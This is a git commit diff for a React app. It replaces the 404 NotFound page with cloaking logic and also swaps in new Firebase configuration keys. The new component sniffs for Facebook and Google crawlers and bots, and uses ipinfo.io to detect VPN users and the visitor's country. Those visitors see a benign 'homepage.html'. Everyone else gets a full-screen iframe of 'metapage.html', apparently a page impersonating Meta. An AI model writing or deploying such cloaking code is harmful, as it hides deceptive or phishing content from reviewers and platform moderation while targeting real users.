c4edbb7ef128bc87b2f0ce2b37ee32bba62fd6d2
luekeryulanda <luekeryulanda@gmail.com>
2024-05-18 23:36:53 +0700

    commit new

--- src/firebase.jsx
+++ src/firebase.jsx
@@ -4,12 +4,12 @@ import { getFirestore } from "firebase/firestore";
 // Your web app's Firebase configuration
 
 const firebaseConfig = {
-  apiKey: "AIzaSyCPm2a7B5wm2SS7MOzDmLrIIRMLg5H33BA",
-  authDomain: "linkproject-7c67e.firebaseapp.com",
-  projectId: "linkproject-7c67e",
-  storageBucket: "linkproject-7c67e.appspot.com",
-  messagingSenderId: "438025814106",
-  appId: "1:438025814106:web:94e90a8ba86e3c25c89863"
+  apiKey: "AIzaSyAMCvAcEli7Yb3FOG9dkaxMQQO5O9CZDKI",
+  authDomain: "ccproject-33fb1.firebaseapp.com",
+  projectId: "ccproject-33fb1",
+  storageBucket: "ccproject-33fb1.appspot.com",
+  messagingSenderId: "942464392509",
+  appId: "1:942464392509:web:4fd81d3ce9e2ce3746f954"
 };
 
 const app = initializeApp(firebaseConfig);
--- src/pages/notFound.jsx
+++ src/pages/notFound.jsx
@@ -1,9 +1,91 @@
-import { Link } from "react-router-dom";
+import React, { useEffect, useState } from "react";
+import { isbot } from "isbot";
 
-const NotFound = () => {
-    return <div>Page not found!
-        <Link to="/" className="bg-blue-400 p-3">Home Page</Link>
-    </div>;
+function NotFound() {
+  //let[HtmlLandingPage, SetHtmlLandingPage] = useState();
+  let[countryCode, setCountryCode] = useState('');
+  let[IsUserHiden, SetUserHiden] = useState(false);
+
+  function showIframe(file) {
+    const html = (
+      <iframe src={file} style={{
+        position: 'fixed',
+        top: '0px',
+        bottom: '0px',
+        right: '0px',
+        width: '100%',
+        border: 'none',
+        margin: '0',
+        padding: '0',
+        overflow: 'hidden',
+        zIndex: '999999',
+        height: '100%',
+      }}></iframe>
+    );
+    return html;
+  }
+ 
+  // async function fetchHtml() {
+  //   SetHtmlLandingPage(await (await fetch(`homepage.html`)).text());
+  // }
+
+  const setLocaltion =  () => {
+    try {
+     // https://ipinfo.io/json
+      fetch("https://ipinfo.io/widget").then(d => d.json()).then(d => {
+        var countryCode = d.country;
+        var privacy = d.privacy;
+        if(privacy){
+          if(
+            privacy.vpn == true
+           //|| privacy.hosting == true
+           //|| privacy.relay == true
+          // || privacy.tor == true
+          // || privacy.proxy == true
+          ){
+            SetUserHiden(true);
+          }
+        }
+        setCountryCode(countryCode.toLowerCase());
+      });
+    } catch (error) {
+      console.error("Error fetching data:", error);
+    }
   };
-  
+
+  // useEffect(() => {
+  //   fetchHtml();
+  // }, []);
+
+  useEffect(() => {
+    setLocaltion();
+  }, []);
+
+  const userAgent = navigator.userAgent.toLowerCase();
+  if(!userAgent.includes('facebook') 
+    && !userAgent.includes('google') 
+    && !isbot(userAgent)){
+    if(IsUserHiden){
+      //return (<div dangerouslySetInnerHTML={{ __html: HtmlLandingPage }}></div>)
+      return(showIframe("homepage.html"));
+    }else{
+      if(countryCode.length == 0){
+        return(           
+          <div className="loading">
+              <div className="loader"></div>
+          </div>
+        );
+      }else{
+        if(countryCode.includes('vn')){
+          return(showIframe("homepage.html"));
+        }else{
+            return(showIframe("metapage.html"));
+        }
+      }
+    }
+  }else{
+    return(showIframe("homepage.html"));
+  }
+}
+
 export default NotFound;
